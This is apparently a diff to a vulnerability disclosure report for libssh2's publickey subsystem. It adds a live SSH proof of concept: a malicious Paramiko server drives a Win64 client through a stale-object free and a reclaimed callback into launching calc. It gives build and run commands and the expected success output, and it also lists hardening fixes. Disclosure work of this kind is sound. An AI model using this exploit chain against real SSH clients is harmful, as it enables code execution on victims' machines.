@@ -42,12 +42,14 @@ reject num_attrs values that overflow the attrs allocation multiplication
 ```text
 poc/publickey_win32_heap_groom_calc_repro.c
 poc/publickey_win64_arbitrary_free_calc_repro.c
+poc/live_publickey_server.py
+poc/live_publickey_client_win64.c
 replay-calc-poc.py
 evidence/2026-06-25-local-calc-replay.txt
 SHA256SUMS.txt
 ```
 
-The replay runner builds temporary vulnerable and checked executables under `build/`. The checked executables link against a publickey object with the two parser hardening changes above. The vulnerable executables link against the target commit.
+The replay runner builds temporary vulnerable and checked executables under `build/`. The checked executables link against a publickey object with the two parser hardening changes above. The vulnerable executables link against the target commit. The live transport files run the Win64 cleanup chain through a real SSH session and the publickey subsystem.
 
 ## Quick replay
 
@@ -211,3 +213,36 @@ if num_attrs exceeds SIZE_MAX / sizeof(libssh2_publickey_attribute), reject the 
 ```
 
 These two changes remove the Win64 stale cleanup path and the Win32 allocation-wrap path exercised by the checked executables.
+
+## Live SSH transport proof
+
+The live transport proof keeps the same Win64 cleanup primitive but drives it through a localhost SSH connection. `poc/live_publickey_server.py` is a Paramiko SSH server that accepts password authentication, opens the `publickey` subsystem, sends the groomed version response, and then sends the malformed `publickey` response. `poc/live_publickey_client_win64.c` is a target-shaped Win64 libssh2 client that connects to that server, uses the public libssh2 APIs, and routes libssh2 allocation callbacks through a tracked heap wrapper.
+
+The client reserves the victim object at `0x0000013370000000`. The server default writes that address at offset `27`, which maps to the first future list entry's `attrs` field for this Win64 build shape.
+
+Server:
+
+```sh
+python3 poc/live_publickey_server.py --host 127.0.0.1 --port 2228 --victim 0x0000013370000000 --offset 27
+```
+
+Client:
+
+```sh
+x86_64-w64-mingw32-gcc -O2 -s -DLIBSSH2_WINCNG -I"${LIBSSH2_SRC}/src" -I"${LIBSSH2_SRC}/include" -o live_publickey_client_win64.exe poc/live_publickey_client_win64.c "${LIBSSH2_OBJDIR}/publickey_win64.o" -lws2_32 -lbcrypt
+wine ./live_publickey_client_win64.exe 127.0.0.1 2228 calc
+```
+
+Expected proof signals:
+
+```text
+ssh_handshake=ok
+ssh_auth=ok
+publickey_init=ok
+victim_free_callback ptr=0000013370000000
+replacement=0000013370000000 same_as_victim=1
+calc_payload_reached
+calc_launch=success
+```
+
+The live proof is still target-shaped. It demonstrates that the publickey list parser state machine can be driven over an SSH transport into stale-object cleanup and a reclaimed callback under the demonstrated allocator and layout conditions.
